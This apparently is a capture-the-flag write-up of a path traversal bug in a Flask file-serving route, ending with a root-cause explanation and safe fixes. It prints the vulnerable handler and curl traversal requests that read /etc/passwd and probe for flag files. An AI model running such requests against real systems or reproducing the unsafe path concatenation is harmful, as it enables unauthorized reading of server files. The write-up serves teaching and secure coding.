# Arbitrary File Read via Path Traversal in a Flask `/payload` Endpoint

## Summary

A Flask application exposed a `/payload/<path>` route that concatenated
user-controlled input directly into a filesystem path before opening the
file. Because the input wasn't sanitized, `../` sequences could be used to
escape the intended `files/` directory and read arbitrary files on the
server, including `/etc/passwd`.

- **Vulnerability class:** Path Traversal → Arbitrary File Read
- **Component:** Flask route handler
- **Impact:** Read any file accessible to the application process

---

## 1. Initial Enumeration

The challenge was hosted at:

```
http://challenge.localhost:80
```

Requesting the root URL returned a `404 Not Found`, confirming the server
was reachable but `/` wasn't a registered route. Further enumeration
identified a working endpoint at `/payload`.

---

## 2. Reviewing the Source

The relevant Flask code:

```python
@app.route("/payload", methods=["GET"])
@app.route("/payload/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path

    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
```

The critical line:

```python
requested_path = app.root_path + "/files/" + path
```

`path` is user-controlled and gets concatenated directly into a filesystem
path with no validation — no check for `../`, no normalization, and no
confirmation that the resolved path actually stays inside `files/`. That's
a textbook path traversal condition.

---

## 3. Confirming the Base Directory

```bash
curl --path-as-is "http://challenge.localhost/payload/../"
```

Response:

```
/challenge/files/../ is a directory challenge/files
```

This confirms the app resolves requests relative to `/challenge/files/`,
and that a single `../` moves up one level to `/challenge/`.

---

## 4. Confirming Traversal Works

Using multiple `../` components moves further up the tree:

```
/challenge/files/../../
         ↓
      /challenge
         ↓
         /
```

```bash
curl --path-as-is "http://challenge.localhost/payload/../../"
```

This demonstrated that the traversal wasn't limited to a single directory
level — it could walk all the way to the filesystem root.

---

## 5. Arbitrary File Read

Since the final step is `open(requested_path).read()`, any file the
process can read is fair game. Testing against a standard Linux file:

```bash
curl --path-as-is "http://challenge.localhost/payload/../../etc/passwd"
```

Request resolution:

```
/challenge/files/../../etc/passwd  →  /etc/passwd
```

The file contents were returned, confirming arbitrary file read — not just
directory listing or traversal in the abstract.

> **Note on `curl --path-as-is`:** without this flag, curl will normalize
> `../` sequences client-side before sending the request, which can
> silently defeat the test. `--path-as-is` sends the path exactly as
> written.

---

## 6. Vulnerable Data Flow

```
User-controlled URL
        ↓
/payload/<path>
        ↓
Flask receives "path"
        ↓
app.root_path + "/files/" + path
        ↓
open(requested_path)
        ↓
Filesystem
```

No sanitization or boundary check happens anywhere in this chain, so any
`../` the attacker supplies is honored.

---

## 7. Locating the Flag

With arbitrary file read confirmed, the next step was guessing likely flag
locations and reading them through the vulnerable endpoint — not on a
local machine, since `find /` run locally only searches the attacker's own
filesystem, not the challenge container's:

```bash
curl --path-as-is "http://challenge.localhost/payload/../flag"
curl --path-as-is "http://challenge.localhost/payload/../flag.txt"
```

(Exact flag path will vary by challenge instance.)

---

## 8. Root Cause & Fix

**Root cause:** untrusted input is concatenated directly into a filesystem
path with no normalization or containment check:

```python
requested_path = app.root_path + "/files/" + path
```

**Recommended fix:** use Werkzeug's built-in safe file-serving helper,
which validates that the resolved path stays within the given directory:

```python
from flask import send_from_directory

@app.route("/payload", methods=["GET"])
@app.route("/payload/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    return send_from_directory(app.root_path + "/files", path)
```

If manual path handling is unavoidable, resolve the path and explicitly
verify it's still inside the allowed base directory before opening it:

```python
import os

base_dir = os.path.realpath(os.path.join(app.root_path, "files"))
requested_path = os.path.realpath(os.path.join(base_dir, path))

if not requested_path.startswith(base_dir + os.sep):
    flask.abort(403)
```

---

## Key Takeaways

- `../` means "parent directory" — unsanitized, it lets an attacker walk
  outside an intended base directory.
- Multiple `../` sequences chain together to escape nested directories.
- `curl --path-as-is` prevents curl from normalizing traversal sequences
  before sending the request.
- A successful read of `/etc/passwd` is a strong, low-risk way to confirm
  arbitrary file read.
- Local commands like `find /` operate on the attacker's own machine —
  the vulnerable endpoint itself must be used to explore the remote
  filesystem.
- The fix is to use a vetted helper like `send_from_directory()`, or to
  resolve and validate the path against the intended base directory before
  opening it.